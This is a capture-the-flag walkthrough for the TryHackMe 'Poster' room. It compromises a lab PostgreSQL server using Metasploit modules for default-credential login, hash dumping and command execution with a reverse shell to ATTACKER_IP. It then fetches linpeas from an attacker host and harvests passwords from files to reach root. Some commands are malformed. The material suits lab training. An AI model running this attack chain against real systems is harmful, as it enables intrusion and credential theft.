# Poster Walkthrough 
<br/>

## Intro
Welcome to the Lookup challenge, here is the link to the [room](https://tryhackme.com/room/poster) on TryHackMe.

This challenge is about hacking RDBMS.

Whenever you feel ready press on "Start Machine" and connect via OpenVPN from your machine or use the AttackBox.

Let's begin!

<br/>
<br/>

## The Challenge
Let's add the domain to the hosts file:
```bash
echo "MACHINE_IP poster.thm" | sudo tee -a /etc/hosts
```

Now we scan for open ports with *nmap*:
```bash
nmap -sV -sC poster.thm
```

We find the following open:
```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 71:ed:48:af:29:9e:30:c1:b6:1d:ff:b0:24:cc:6d:cb (RSA)
|   256 eb:3a:a3:4e:6f:10:00:ab:ef:fc:c5:2b:0e:db:40:57 (ECDSA)
|_  256 3e:41:42:35:38:05:d3:92:eb:49:39:c6:e3:ee:78:de (ED25519)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Poster CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-07-29T00:54:25
|_Not valid after:  2030-07-27T00:54:25

```

Visiting the website at `http://poster.thm` we find no valuable information.

We can now move the investigation of the PostgreSQL server.

We can leverage a Metasploit module to enumerate users:
```bash
msfconsole
```

Search for modules related to our job:
```bash
search postgresql
```

```bash
use auxiliary/scanner/postgres/postgres_login
```

```bash
set RHOSTS MACHINE_IP
```

Execute it:
```bash
run
```

We quickly find some valid credentials: `postgres:password` -> template 1 database.

Now let's search a module for code execution, this one should fit our needs:
```bash
use auxiliary/admin/postgres/postgres_sql 
```

Set the parameters:
```bash
set RHOSTS MACHINE_IP
```
```bash
set USERNAME postgres
```
```bash
set PASSWORD password
```
```bash
run
```

This prints us the Postgres version: 
```
PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
```

Searching online we can find that this version has multiple vulnerabilities, from arbitrary SQL code execution to privilege escalation.

Since this challenge wants us to use Metasploit for the whole job, we can search for a module to dump user hashes:
```bash
use  auxiliary/scanner/postgres/postgres_hashdump
```

Set the parameters:
```bash
set RHOSTS MACHINE_IP
```
```bash
set USERNAME postgres
```
```bash
set PASSWORD password
```
```bash
run
```

We find the 6 user password's hashes:
```
Username   Hash
 --------   ----
 darkstart  md58842....
 poster     md578fb...
 postgres   md532e1....
 sistemas   md5f7db....
 ti         md57af9....
 tryhackme  md503aa.....

```

Those are all MD5 hashes, we can put them in a file called `hashes.txt` and crack them, can use an online tool like this [one](https://hashes.com/en/decrypt/hash)
```
darkstart:REDACTED_PASSWORD
postgres:REDACTED_PASSWORD
ti:REDACTED_PASSWORD
poster:REDACTED_PASSWORDs
```

For the answer this module allows to read files if authenticated:
```bash
use auxiliary/admin/postgres/postgres_readfile 
```

Now we run the module to get command execution:
```bash
use multi/postgres/postgres_copy_from_program_cmd_exec
```

```
set LHOST ATTACKER_IP
```
```
set RHOSTS 10.10.138.23
```
```
set PASSWORD  password
```
```
set DATABASE postgres
```
```
run
```

We got a shell, let's upgrade it (if you do not know how, i made a guide [here](https://github.com/Maat-Cyber/Maat-Cyber-World/blob/main/Tips-%26-Resources/Reverse_Shell-Upgrade.md)).

Looking around we can find 2 users: "alison" and "dark".
There is a file in the "dark" home  directory called `credentials.txt` open it:
```
cat /home/dark/credentials.txt
```

Inside we find it's password: `dark:REDACTED`.

For a more stable connection we can login via SSH:
```bash
ssh dark@poster.thm
```

<br/>

### Privilege Escalation
Now we need to escalate our privileges.
Firstly we ill be moving laterally to the user "alison" to get the user flag, then to the root.

Let's check some permissions:
```
sudo -l
```

W can't run any command  with `sudo`.

Let's transfer *linpeas* on the target:
On your machine start an HTTP server:
```bash
python3 -m http.server
```

On target:
```
wget://YOUR_IP:8000/linpeas.sh
```

Make the file executable and run it:
```bash
chmod +x linepeas.sh
./linpeas.sh
```

The script find alison password in this file:
```bash
cat /var/www/html/config.php
```

```
	$dbhost = "127.0.0.1";
	$dbuname = "alison";
	$dbpass = "REDACTED_PASSWORD";
	$dbname = "mysudopassword";
```

Now change user:
```bash
su alison
```

Now we can read the first flag:
```bash
cat ~/user.txt
```
--> REDACTED

Time to find a way to become root.

Let's check what we can run with `sudo` as Alison:
```bash
sudo -l
```

This time we are allowed to run any command.
Let's become root:
```bash
sudo su
```

Now with the privileged shell we can get the root flag:
```bash
cat /root/root.txt
```
<br/>
<br/>

## Conclusion
Congratulations you have successfully practiced with Metasploit and hacked the database!

I hope you had fun doing the challenge and following along!

Catch you in the next CTF 😃 
